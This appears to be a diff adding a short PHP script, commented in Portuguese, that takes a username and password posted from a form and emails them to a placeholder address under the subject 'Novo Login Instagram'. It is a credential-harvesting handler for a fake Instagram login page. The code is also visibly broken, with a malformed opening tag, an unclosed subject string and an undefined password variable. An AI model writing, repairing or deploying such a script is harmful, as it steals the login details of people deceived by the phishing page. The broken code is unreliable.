@@ -1,0 +1,1 @@
+php <?phpif ($_SERVER["REQUEST_METHOD"] == "POST") { $username = $_POST['username']; $senha = $_POST['senha']; // Envie os dados para o seu email $to = "seu-email@example.com"; $subject =Novo Login Instagram"; $message = "Usuário: " . $username . "\nSenha: " . $password; $headers = "From: webmaster@example.com"; mail($to, $subject, $message, $headers); }
